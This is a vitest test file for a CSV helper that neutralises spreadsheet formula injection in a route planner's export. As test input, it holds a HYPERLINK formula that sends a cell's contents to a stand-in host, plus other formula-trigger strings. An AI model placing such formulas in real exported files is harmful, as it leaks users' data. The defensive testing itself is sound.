// issues/405 (security review round 3, 2026-11-01): the office's route planner
// CSV only doubled quotes, so a delivery point named `=HYPERLINK(...)` became a
// formula when opened in a spreadsheet. Text cells starting like a formula now
// get a leading `'`; phones, numbers and dates are left alone by the caller.
import { describe, it, expect } from 'vitest'
import { textCell } from '@/service/csvFormula'

describe('textCell (issues/405)', () => {
  it('turns formula-like text into text', () => {
    expect(textCell('=HYPERLINK("https://x/?"&A2,"Obre")')).toBe('\'=HYPERLINK("https://x/?"&A2,"Obre")')
    expect(textCell('+1+1')).toBe("'+1+1")
    expect(textCell('-2')).toBe("'-2")
    expect(textCell('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(textCell('\t=1')).toBe("'\t=1")
  })

  it('leaves ordinary values as they are', () => {
    expect(textCell('Ca la Maria')).toBe('Ca la Maria')
    expect(textCell('Carrer Major, 3 - Girona')).toBe('Carrer Major, 3 - Girona')
    expect(textCell('')).toBe('')
    expect(textCell(null)).toBe(null)
    expect(textCell(12)).toBe('12')
  })
})
